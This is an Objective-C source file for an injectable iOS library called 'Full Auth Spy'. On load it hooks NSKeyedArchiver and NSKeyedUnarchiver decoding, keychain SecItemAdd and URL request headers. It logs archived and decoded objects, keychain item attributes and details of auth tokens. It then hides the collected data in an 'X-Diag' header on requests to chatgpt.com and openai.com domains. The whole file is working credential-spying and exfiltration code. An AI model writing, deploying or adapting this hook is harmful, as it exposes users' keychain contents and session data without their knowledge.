/*
 * Full Auth Spy - hooks NSKeyedArchiver, NSKeyedUnarchiver, UserDefaults, NSMutableURLRequest
 * Compile: xcrun --sdk iphoneos clang -arch arm64 -dynamiclib -framework Foundation -framework Security -o unarchiver_spy.dylib unarchiver_spy.m -miphoneos-version-min=15.0
 */
#import <Foundation/Foundation.h>
#import <Security/Security.h>
#import <objc/runtime.h>
#import <objc/message.h>

static NSMutableArray *q = nil;
// Rebuild marker to force CI recompilation.
static void enq(NSString *s) {
    if (!q) q = [NSMutableArray new];
    [q addObject:s];
    if (q.count > 30) [q removeObjectAtIndex:0];
    NSLog(@"%@", s);
}

// ============================================================
// Hook +[NSKeyedArchiver archivedDataWithRootObject:requiringSecureCoding:error:]
// Captures WRITING/ENCODING of credentials
// ============================================================
static NSData *(*real_archive)(id, SEL, id, BOOL, NSError **);
static NSData *hook_archive(id self, SEL _cmd, id obj, BOOL secure, NSError **err) {
    enq([NSString stringWithFormat:@"[ARCHIVE] class=%@ secure=%d",
         NSStringFromClass([obj class]), secure]);
    enq([NSString stringWithFormat:@"[ARCHIVE_DESC] %@",
         [[obj description] substringToIndex:MIN(1000, [[obj description] length])]]);

    // Also dump all properties via KVC
    if ([obj respondsToSelector:@selector(accessToken)]) {
        id at = [obj valueForKey:@"accessToken"];
        id rt = [obj valueForKey:@"refreshToken"];
        id it = [obj valueForKey:@"idToken"];
        id tt = [obj valueForKey:@"tokenType"];
        enq([NSString stringWithFormat:@"[ARCHIVE_PROPS] accessToken=%@ refreshToken=%@ idToken=%@ tokenType=%@",
             at ? [NSString stringWithFormat:@"%lu chars", (unsigned long)[at length]] : @"nil",
             rt ? [NSString stringWithFormat:@"%lu chars", (unsigned long)[[rt description] length]] : @"nil",
             it ? [NSString stringWithFormat:@"%lu chars", (unsigned long)[it length]] : @"nil",
             tt ? tt : @"nil"]);
    }

    return real_archive(self, _cmd, obj, secure, err);
}

// ============================================================
// Hook +[NSKeyedUnarchiver unarchiveObjectWithData:]
// ============================================================
static id (*real_unarchive)(id, SEL, NSData *);
static id hook_unarchive(id self, SEL _cmd, NSData *data) {
    enq([NSString stringWithFormat:@"[UNARCHIVE] data len=%lu", (unsigned long)data.length]);
    id obj = real_unarchive(self, _cmd, data);
    if (obj) {
        enq([NSString stringWithFormat:@"[UNARCHIVE_RESULT] class=%@ desc=%@",
             NSStringFromClass([obj class]),
             [[obj description] substringToIndex:MIN(500, [[obj description] length])]]);
    }
    return obj;
}

// ============================================================
// Hook -[NSKeyedUnarchiver decodeObjectForKey:]
// ============================================================
static id (*real_decode)(id, SEL, NSString *);
static id hook_decode(id self, SEL _cmd, NSString *key) {
    id val = real_decode(self, _cmd, key);
    if (key) {
        enq([NSString stringWithFormat:@"[DECODE] key=%@ class=%@ val=%@",
             key, val ? NSStringFromClass([val class]) : @"nil",
             val ? [[val description] substringToIndex:MIN(200, [[val description] length])] : @"nil"]);
    }
    return val;
}

// ============================================================
// Hook SecItemAdd via dlsym
// ============================================================
static OSStatus (*real_Add)(CFDictionaryRef, CFTypeRef *);
static OSStatus hook_Add(CFDictionaryRef attrs, CFTypeRef *result) {
    NSString *a = [(__bridge NSDictionary *)attrs description];
    enq([NSString stringWithFormat:@"[KC_ADD] %@", a]);
    return real_Add(attrs, result);
}

// ============================================================
// Hook NSMutableURLRequest
// ============================================================
static void (*real_setHdr)(id, SEL, NSString *, NSString *);
static void hook_setHdr(id self, SEL _cmd, NSString *v, NSString *f) {
    NSURL *url = ((id (*)(id, SEL))objc_msgSend)(self, @selector(URL));
    NSString *host = ((id (*)(id, SEL))objc_msgSend)(url, @selector(host));
    if (host && q && q.count > 0 &&
        ([host containsString:@"chatgpt.com"] || [host containsString:@"openai.com"] || [host containsString:@"oaistatic.com"])) {
        NSString *payload = [q componentsJoinedByString:@"|"];
        real_setHdr(self, _cmd, payload, @"X-Diag");
        [q removeAllObjects];
    }
    real_setHdr(self, _cmd, v, f);
}

__attribute__((constructor))
static void init(void) {
    enq(@"[SPY_START]");

    // Hook NSKeyedArchiver (class method)
    Method ma = class_getClassMethod(NSClassFromString(@"NSKeyedArchiver"),
                                     @selector(archivedDataWithRootObject:requiringSecureCoding:error:));
    if (ma) {
        real_archive = (void *)method_setImplementation(ma, (IMP)hook_archive);
        enq(@"[SPY] Hooked NSKeyedArchiver");
    }

    // Hook NSKeyedUnarchiver (class method)
    Method mu = class_getClassMethod(NSClassFromString(@"NSKeyedUnarchiver"),
                                     @selector(unarchiveObjectWithData:));
    if (mu) {
        real_unarchive = (void *)method_setImplementation(mu, (IMP)hook_unarchive);
        enq(@"[SPY] Hooked NSKeyedUnarchiver");
    }

    // Hook NSKeyedUnarchiver (instance method)
    Method md = class_getInstanceMethod(NSClassFromString(@"NSKeyedUnarchiver"),
                                        @selector(decodeObjectForKey:));
    if (md) {
        real_decode = (void *)method_setImplementation(md, (IMP)hook_decode);
        enq(@"[SPY] Hooked decodeObjectForKey:");
    }

    // Hook SecItemAdd via fishhook if available
    void *fish = dlsym(RTLD_DEFAULT, "rebind_symbols");
    if (fish) {
        struct { const char *n; void *r; void **o; } rb[] = {
            {"SecItemAdd", hook_Add, (void **)&real_Add}
        };
        ((int(*)(void*,size_t))fish)(rb, 1);
        enq(@"[SPY] Hooked SecItemAdd");
    } else {
        enq(@"[SPY] No fishhook for SecItemAdd");
    }

    // Hook NSMutableURLRequest
    Method mh = class_getInstanceMethod(NSClassFromString(@"NSMutableURLRequest"),
                                        @selector(setValue:forHTTPHeaderField:));
    if (mh) {
        real_setHdr = (void *)method_setImplementation(mh, (IMP)hook_setHdr);
        enq(@"[SPY] Hooked header injection");
    }
}
